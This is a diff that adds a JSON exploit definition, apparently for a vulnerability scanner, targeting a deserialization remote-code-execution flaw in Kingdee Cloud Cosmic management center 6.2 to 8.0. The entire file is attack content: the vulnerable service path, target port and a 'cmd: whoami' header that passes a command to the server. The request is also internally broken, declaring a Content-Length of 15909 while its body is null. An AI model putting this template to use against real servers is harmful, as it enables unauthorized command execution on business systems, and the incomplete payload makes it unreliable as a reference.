@@ -1,0 +1,42 @@
+{
+  "vulnerability": {
+    "name": "金蝶云星空管理中心反序列化rce漏洞",
+    "type": [
+      "RCE"
+    ],
+    "affected_software": [
+      {
+        "name": "金蝶云星空-管理中心",
+        "version": "6.2/7.0/8.0"
+      }
+    ],
+    "exploit": {
+      "method": "http",
+      "variables": {
+        "lhost": null,
+        "lport": null,
+        "rhost": null,
+        "rport": "8000",
+        "values": {
+          "values1": "whoami"
+        }
+      },
+      "exploit_payload":{
+          "method": "POST",
+          "path": "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc",
+          "http_version": "HTTP/1.1",
+          "headers": {
+              "Host": "{{ variables.rhost }}:{{ variables.rport }}",
+              "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.223.11 Safari/537.36",
+              "Accept": "*/*",
+              "Accept-Encoding": "gzip, deflate",
+              "Content-Type": "text/json",
+              "cmd":"whoami",
+              "Content-Length": 15909
+          },
+        "body": null
+      }
+    },
+    "response_payload": null
+  }
+}
